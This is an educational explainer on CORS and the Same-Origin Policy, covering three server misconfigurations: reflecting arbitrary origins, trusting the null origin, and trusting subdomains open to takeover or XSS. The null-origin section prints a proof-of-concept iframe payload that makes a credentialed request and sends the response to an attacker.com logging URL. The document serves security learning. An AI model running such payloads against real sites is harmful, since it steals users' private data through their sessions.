Concept & Theory: CORS

What is CORS?

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls whether a website running on one origin is allowed to read data from a different origin.

To understand why it exists, you first need to know about the Same-Origin Policy (SOP) — the default rule browsers follow. SOP says: JavaScript running on website-a.com cannot read responses from requests made to website-b.com, even if it can technically send the request. This exists to stop a malicious site from silently reading your private data on another site (like your bank, email, etc.) using your logged-in session.

An origin is defined by three things: scheme (http/https) + domain + port. If any one of these differs, it's a different origin.

Now, SOP is too strict for the real internet — legitimate cases exist where one site genuinely needs to fetch data from another (a company's API serving its own frontend hosted on a different subdomain, a third-party widget, etc.). CORS is the controlled exception mechanism that lets a server say "it's fine, this other origin is allowed to read my response."

The server does this using response headers — mainly: Access-Control-Allow-Origin: https://trusted-site.com

When a browser gets this header back, it checks: does this match the origin of the site that made the request? If yes, the browser allows the requesting JavaScript to read the response. If no (or the header is missing), the browser blocks it.

Key point to remember: The browser is the enforcer, the server is the one deciding who to trust (via the header), and the requesting website has no control over that decision — it can only ask.

Where the vulnerability comes in: CORS itself isn't a bug — it's the server's misconfiguration of these headers (trusting too much, too loosely, or something insecure) that creates the vulnerability. That's exactly the 3 variants we just covered: reflecting any origin, trusting null, and trusting subdomains that turn out to be insecure or takeover-able.

The 3 Variants

Variant 1: Basic misconfiguration — reflecting arbitrary origin

This is the simplest and most common flaw. Instead of checking the incoming Origin header against a real whitelist, the server just copies whatever origin it receives straight back into the Access-Control-Allow-Origin response header.

Request:
Origin: https://evil-attacker.com

Response:
Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true

Since the server accepts any origin, an attacker's site can send a credentialed request (cookies included) to a sensitive endpoint, and the browser — seeing its own origin reflected back — allows the attacker's JavaScript to read the response. No trickery needed; the server does all the work of trusting the attacker.

Test for it: Send a request with a random, made-up Origin (e.g. https://random123.com) and see if it comes back reflected.

Variant 2: Trusting the null origin

Browsers send Origin: null in specific edge cases — sandboxed iframes, data: URLs, local file:// pages, redirects. Developers sometimes whitelist null because it shows up during local testing, and forget to remove it before shipping.

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

This is dangerous because null isn't tied to any real, ownable domain — anyone can generate a request with Origin: null on demand, just by loading their exploit page inside a sandboxed iframe:

<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
 src="data:text/html,<script>
   var req = new XMLHttpRequest();
   req.onload = function(){ location='https://attacker.com/log?key='+this.responseText; };
   req.open('get','https://vulnerable-website.com/sensitive-data',true);
   req.withCredentials = true;
   req.send();
 </script>"></iframe>

The sandbox strips the iframe of a normal origin, forcing null — and if the server trusts null, the stolen data flows straight to the attacker.

Variant 3: Trusting subdomains that are vulnerable to takeover

Here the server does something that sounds reasonable — it whitelists its own subdomains, like:

Access-Control-Allow-Origin: https://forum.vulnerable-website.com

The problem: that subdomain isn't actually safe just because it shares the parent domain name. It can become attacker-controlled in a couple of ways:

  • Subdomain takeover — forum.vulnerable-website.com used to point (via DNS CNAME) to a third-party service like an old hosting platform, cloud storage bucket, or SaaS tool. That service was decommissioned, but the DNS record was never cleaned up. An attacker can now register that same service under their own account, and the DNS record will happily route to the attacker's content instead. The subdomain now shows an attacker page — but the browser still sees it as the trusted subdomain, origin and all.
  • XSS on the subdomain — even without full takeover, if that subdomain has any XSS bug, an attacker can inject and run script that executes as that trusted origin.

Either way, the attacker ends up running JavaScript that the parent site's CORS whitelist considers 100% trustworthy — so requests to sensitive endpoints succeed, cookies and all, and the response gets exfiltrated exactly like the other two variants.
